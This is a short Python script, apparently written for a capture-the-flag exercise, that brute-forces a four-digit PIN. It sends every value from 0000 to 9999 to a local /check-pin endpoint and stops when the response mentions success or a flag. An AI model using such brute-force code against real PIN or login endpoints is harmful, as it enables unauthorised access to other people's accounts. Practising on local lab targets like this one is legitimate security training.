import requests
import json

url = "http://localhost:5000/check-pin"

for pin in range(10000):  # 0000 to 9999
    pin_str = f"{pin:04d}"  # pad with zeroes to make it 4-digit
    data = {"pin": pin_str}
    
    # response = requests.post(url, data=data)
    headers = {"Content-Type": "application/json"}
    response = requests.post(url, data=json.dumps(data), headers=headers)

    # Optional: print progress
    print(f"Trying PIN: {pin_str} => {response.status_code}")

    # Check if PIN is correct
    if "success" in response.text.lower() or "flag" in response.text.lower():
        print(f"\n🎉 PIN FOUND: {pin_str}")
        print("Response:")
        print(response.text)
        break
